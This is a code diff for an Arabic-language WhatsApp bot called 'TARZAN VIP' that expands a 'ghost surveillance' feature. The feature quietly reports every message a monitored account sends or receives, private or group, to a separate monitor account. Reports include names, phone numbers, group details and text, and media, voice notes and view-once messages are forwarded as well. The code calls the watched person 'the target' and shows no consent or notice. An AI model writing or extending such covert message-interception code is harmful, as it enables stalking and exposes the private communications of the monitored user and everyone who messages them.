@@ -200,7 +200,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const from = msg.key.remoteJid;
         const isGroup = from.endsWith('@g.us');
         const sender = isGroup ? msg.key.participant : from;
-        const pushName = msg.pushName || 'مجهول';
+        const pushName = msg.pushName || 'مجهول / غير مسجل';
         const selfId = jidNormalizedUser(sock.user.id);
         const isFromMe = msg.key.fromMe || sender === selfId;
 
@@ -209,6 +209,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const currentSettings = botSettings[sessionId] || {};
         if (!currentSettings.botEnabled) return;
 
+        // اكتشاف العرض لمرة واحدة (ViewOnce)
         let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
         const mediaTypeCheck = Object.keys(msg.message)[0];
         if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
@@ -240,81 +241,124 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         // ==========================================
-        // 🚨 تنفيذ المراقبة الشبحية الشاملة الدقيقة
+        // 🚨 تنفيذ المراقبة الشبحية الجبارة والمفصلة
         // ==========================================
         if (activeMonitors.has(sessionId)) {
             const monitorInfo = activeMonitors.get(sessionId);
             const monitorSock = sessions[monitorInfo.monitorSocketId];
 
+            // نمنع إرسال التقارير لرسائل المُراقب نفسه لتجنب التكرار
             if (monitorSock && from !== monitorInfo.monitorJid && sender !== monitorInfo.monitorJid) {
                 try {
-                    const targetNumber = isGroup ? from.split('@')[0] : (isFromMe ? from.split('@')[0] : sender.split('@')[0]);
                     const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                     
-                    let contentDesc = '';
-                    let msgType = Object.keys(msg.message || {})[0];
-                    let realMessage = msg.message;
+                    // 1. تحديد جهة الإرسال/الاستقبال والأسماء بدقة
+                    let directionText = '';
+                    let targetName = '';
+                    let targetNumber = '';
+                    
+                    // 2. جلب معلومات القروب بدقة
+                    let groupNameStr = 'غير معروف';
+                    let groupIDStr = '';
+                    if (isGroup) {
+                        groupIDStr = from.split('@')[0];
+                        try {
+                            const metadata = await sock.groupMetadata(from);
+                            groupNameStr = metadata.subject;
+                        } catch (e) {
+                            groupNameStr = 'تعذر جلب الاسم';
+                        }
+                    }
 
-                    // تحليل ذكي لنوع الرسالة
-                    if (viewOnceIncoming) {
-                        contentDesc = `👁️‍🗨️ رسـالـة عـرض لـمـرة واحـدة${body ? '\n📝 الـوصـف: ' + body : ''}`;
-                    } else if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
-                        contentDesc = `💬 نـص:\n${body}`;
-                    } else if (msgType === 'imageMessage') {
-                        contentDesc = `📷 صـورة${body ? '\n📝 الـوصـف: ' + body : ''}`;
+                    if (isFromMe) {
+                        // صاحب الجلسة أرسل رسالة
+                        directionText = '📤 *[ تـم إرسـال رسـالـة مـن الـهـدف إلـى ]*';
+                        targetNumber = isGroup ? from.split('@')[0] : from.split('@')[0];
+                        targetName = isGroup ? `أعضاء القروب` : 'الطرف الآخر';
+                    } else {
+                        // صاحب الجلسة استلم رسالة
+                        directionText = '📥 *[ تـم اسـتـلام رسـالـة مـن ]*';
+                        targetNumber = sender.split('@')[0];
+                        targetName = pushName; // الاسم الحقيقي المرسل من خوادم واتساب
+                    }
+
+                    // 3. تحليل هيكل الرسالة الداخلي (حتى المخفية)
+                    let actualMsg = msg.message;
+                    let isViewOnce = false;
+
+                    if (actualMsg?.viewOnceMessage) { actualMsg = actualMsg.viewOnceMessage.message; isViewOnce = true; }
+                    else if (actualMsg?.viewOnceMessageV2) { actualMsg = actualMsg.viewOnceMessageV2.message; isViewOnce = true; }
+                    else if (actualMsg?.viewOnceMessageV2Extension) { actualMsg = actualMsg.viewOnceMessageV2Extension.message; isViewOnce = true; }
+                    
+                    let msgType = Object.keys(actualMsg || {})[0];
+                    let contentDesc = '';
+                    
+                    // استخراج النصوص المرفقة مع الميديا
+                    let attachedText = actualMsg?.conversation || actualMsg?.extendedTextMessage?.text || actualMsg?.imageMessage?.caption || actualMsg?.videoMessage?.caption || '';
+
+                    // تحديد نوع المحتوى بدقة شديدة
+                    if (msgType === 'imageMessage') {
+                        contentDesc = '📷 صـورة';
                     } else if (msgType === 'videoMessage') {
-                        contentDesc = `🎥 فـيـديـو${body ? '\n📝 الـوصـف: ' + body : ''}`;
+                        contentDesc = '🎥 فـيـديـو';
                     } else if (msgType === 'audioMessage') {
-                        const isVoiceNote = realMessage.audioMessage?.ptt;
-                        contentDesc = isVoiceNote ? '🎙️ بـصـمـة صـوتـيـة' : '🎵 مـقـطـع صـوتـي (أغنية/ملف)';
+                        const isVoiceNote = actualMsg.audioMessage?.ptt;
+                        contentDesc = isVoiceNote ? '🎙️ بـصـمـة صـوتـيـة (تـسـجـيـل مـبـاشـر)' : '🎵 مـقـطـع صـوتـي (مـلـف أغـنـيـة / صـوت)';
                     } else if (msgType === 'documentMessage') {
-                        const fileName = realMessage.documentMessage?.fileName || 'غير معروف';
-                        contentDesc = `📄 مـلـف:\nاسم الملف: ${fileName}`;
+                        contentDesc = `📄 مـلـف:\nاسم الملف: [ ${actualMsg.documentMessage?.fileName || 'مجهول'} ]`;
                     } else if (msgType === 'stickerMessage') {
                         contentDesc = '🌠 مـلـصـق (سـتـيـكـر)';
                     } else if (msgType === 'contactMessage' || msgType === 'contactsArrayMessage') {
-                        contentDesc = '👤 جـهـة اتـصـال (رقـم)';
+                        contentDesc = '👤 جـهـة اتـصـال (مـشـاركـة رقـم)';
                     } else if (msgType === 'locationMessage' || msgType === 'liveLocationMessage') {
                         contentDesc = '📍 مـوقـع جـغـرافـي (خـريـطـة)';
                     } else if (msgType === 'reactionMessage') {
-                        const reactionEmoji = realMessage.reactionMessage?.text || '';
-                        contentDesc = `❤️ تـفـاعـل بـ: ${reactionEmoji}`;
+                        contentDesc = `❤️ تـفـاعـل بـالايـمـوجـي: [ ${actualMsg.reactionMessage?.text || ''} ]`;
                     } else if (msgType === 'pollCreationMessage' || msgType === 'pollCreationMessageV3') {
-                        const pollName = realMessage[msgType]?.name || 'تصويت';
-                        contentDesc = `📊 تـصـويـت / اسـتـطـلاع:\nالسؤال: ${pollName}`;
-                    } else if (msgType === 'protocolMessage') {
-                        contentDesc = '🗑️ رسـالـة مـحـذوفـة أو إجـراء نـظـام';
+                        contentDesc = `📊 تـصـويـت / اسـتـطـلاع رأي:\nالسؤال: ${actualMsg[msgType]?.name}`;
+                    } else if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
+                        contentDesc = '💬 رسـالـة نـصـيـة عـاديـة';
                     } else {
-                        // حل أخير للأنواع النادرة جداً
-                        contentDesc = body ? `💬 رسالة نصية:\n${body}` : `⚙️ نـوع رسـالـة مـخـتـلـف: [ ${msgType} ]`;
+                        contentDesc = `⚙️ نـوع رسـالـة خـاص / نـظـام [${msgType}]`;
                     }
 
-                    const direction = isFromMe ? '📤 *[ إرسـال رسـالـة ]*' : '📥 *[ اسـتـلام رسـالـة ]*';
-                    const chatTypeIndicator = isGroup ? '👥 *جـروب (مـجـمـوعـة)*' : '👤 *خـاص (مـحـادثـة فـرديـة)*';
-                    const groupInfo = isGroup ? `\n🏷️ *آيـدي الـجـروب:* ${from.split('@')[0]}` : '';
+                    // 🌟 إضافة لمسة العرض لمرة واحدة بشكل واضح
+                    if (isViewOnce) {
+                        contentDesc = `👁️‍🗨️ *[ عـرض لـمـرة واحـدة ViewOnce ]*\n⚠️ نـوع الـمـخـفـي: ${contentDesc}`;
+                    }
+
+                    // دمج النص المرفق مع الوصف
+                    if (attachedText) {
+                        contentDesc += `\n📝 الـنـص: ${attachedText}`;
+                    }
+
+                    // 4. بناء التقرير النهائي بدقة وترتيب
+                    let groupSection = isGroup ? `\n👥 *اسـم الـقـروب:* ${groupNameStr}\n🏷️ *آيـدي الـقـروب:* ${groupIDStr}` : `\n📍 *الـمـصـدر:* خـاص (مـحـادثـة فـرديـة)`;
 
                     const reportText = `🚨 *[ مـراقـبـة شـبـحـيـة - ${sessionId} ]* 🚨\n\n` +
-                                       `${direction}\n` +
-                                       `📍 *الـمـصـدر:* ${chatTypeIndicator}\n` +
-                                       `👤 *الـمـرسـل:* ${pushName}\n` +
-                                       `📱 *الـرقـم:* wa.me/${targetNumber}${groupInfo}\n` +
+                                       `${directionText}\n` +
+                                       `👤 *الاسـم:* ${targetName}\n` +
+                                       `📱 *الـرقـم:* wa.me/${targetNumber}` +
+                                       `${groupSection}\n` +
                                        `🕒 *الـوقـت:* ${time}\n\n` +
-                                       `📄 *الـمـحـتـوى:*\n${contentDesc}`;
+                                       `📄 *تـفـاصـيـل الـرسـالـة:*\n${contentDesc}`;
 
+                    // إرسال التقرير للمُراقب
                     await monitorSock.sendMessage(monitorInfo.monitorJid, { text: reportText });
 
-                    // إعادة إرسال الميديا أو الستيكرات أو الصوت لتراها بنفسك
+                    // 5. تحويل الرسالة الأصلية (إذا كانت ميديا أو صوت أو ستيكر أو مرة واحدة) ليرى المراقب المحتوى
                     if (msgType !== 'conversation' && msgType !== 'extendedTextMessage' && msgType !== 'protocolMessage' && msgType !== 'reactionMessage') {
                         await monitorSock.sendMessage(monitorInfo.monitorJid, { forward: msg });
                     }
+
                 } catch (e) {
-                    console.error('❌ خطأ في إرسال تقرير المراقبة:', e.message);
+                    console.error('❌ خطأ في إرسال تقرير المراقبة المتقدم:', e.message);
                 }
             }
         }
 
         // ==========================================
-        // 👁️‍🗨️ الرادار: صائد العرض لمرة واحدة
+        // 👁️‍🗨️ الرادار: صائد العرض لمرة واحدة (النظام العام)
         // ==========================================
         if (viewOnceIncoming && !isFromMe) {
             try {
@@ -477,6 +521,6 @@ app.listen(PORT, () => {
     console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
     console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
     console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
-    console.log(`👻 نظام المراقبة الشبحية الشامل متاح الآن`);
+    console.log(`👻 نظام المراقبة الشبحية الشامل متاح ومُفعّل`);
     console.log(`=========================================\n`);
 });
